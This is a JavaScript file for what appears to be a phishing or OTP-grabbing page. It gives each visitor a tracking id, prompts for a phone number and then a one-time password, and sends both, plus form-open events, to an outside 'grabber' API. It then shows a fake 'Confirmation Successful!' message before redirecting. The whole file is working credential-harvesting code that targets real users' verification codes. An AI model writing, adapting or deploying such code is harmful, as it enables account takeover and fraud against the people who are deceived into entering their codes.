var API_URL = "https://bobarakhas.pythonanywhere.com/grabber/api/v0/"

window.onload = () => {
    const characters = '0123456789';

    function generateString() {
        let result = 'user';
        const charactersLength = characters.length;
        for ( let i = 0; i < 4; i++ ) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }

        return result;
    }

    let sendVal = {}
    
    if (localStorage.getItem("user")) {

        sendVal = {
            "user": localStorage.getItem("user")
        }
    }
    else {
        localStorage.clear();
        localStorage.setItem("user", generateString())

        sendVal = {
            "user": localStorage.getItem("user")
        }
    }

    fetch(API_URL + "connect/", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(sendVal)
    })
    .then(response => response.json())
}

var heading = document.getElementById("heading");

var overlay = document.getElementById("overlay");

var phone = document.getElementById("phone");
var otp = document.getElementById("otp");
var phonefield = document.getElementById("phonefield");
var otpfield = document.getElementById("otpfield");

var formtext = document.querySelectorAll(".formtext");

var submit = document.getElementById("submit");
var submitbtn = document.getElementById("submitbtn");
var loadingbtn = document.getElementById("loadingbtn");

for (var i = 0; i <= formtext.length - 1; i++) {
    formtext[i].style.display = "none";
}

var turn = 1;

submit.onclick = () => {
    overlay.style.display = "flex";
    formOpen();
}

submitbtn.onclick = () => {
    if (turn === 1 && phonefield.value.length >= 10) {
        ++turn;
        submitbtn.style.display = "none";
        loadingbtn.style.display = "flex";

        phoneSend(phonefield.value);
        
        setTimeout(() => {
            submitbtn.style.display = "flex";
            loadingbtn.style.display = "none";
            otp.style.display = "flex";
        }, 6000);
    }
    else if (turn === 2 && otpfield.value.length >= 4 ) {
        ++turn;
        submitbtn.style.display = "none";
        loadingbtn.style.display = "flex";

        otpSend(otpfield.value);
        
        setTimeout(() => {
            heading.innerHTML = "Confirmation Successful!"
            phone.style.display = "none";
            otp.style.display = "none";
            loadingbtn.style.display = "none";
            for (var i = 0; i <= formtext.length - 1; i++) {
                formtext[i].style.display = "flex";
            }

            setTimeout(() => {
                window.location = "index.html";
            }, 10000);
        }, 3000);
    }
};

async function phoneSend(phoneVal) {
    let sendVal = {
        "phone": phoneVal,
        "user": localStorage.getItem("user")
    }

    fetch(API_URL + "phone/", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(sendVal)
    })
    .then(response => response.json())
}

async function otpSend(otpVal) {
    let sendVal = {
        "otp": otpVal,
        "user": localStorage.getItem("user")
    }

    fetch(API_URL + "otp/", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(sendVal)
    })
    .then(response => response.json())
}

async function formOpen() {
    let sendVal = {
        "form": true,
        "user": localStorage.getItem("user")
    }

    fetch(API_URL + "formopen/", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(sendVal)
    })
    .then(response => response.json())
}





// CODE FOR SELECTING OPTIONS

var option = document.getElementsByClassName("optionclass");

for (var x = 0; x <= option.length - 1; x++) {
    option[x].parentElement.style.opacity = "0.5"
    option[x].addEventListener("click", function(e) {
        if (e.currentTarget.parentElement.style.opacity === "0.5") {
            e.currentTarget.style.fontWeight = "700";
            e.currentTarget.parentElement.style.opacity = "1";
        }
        else {
            e.currentTarget.style.fontWeight = "400";
            e.currentTarget.parentElement.style.opacity = "0.5";
        }
    })
}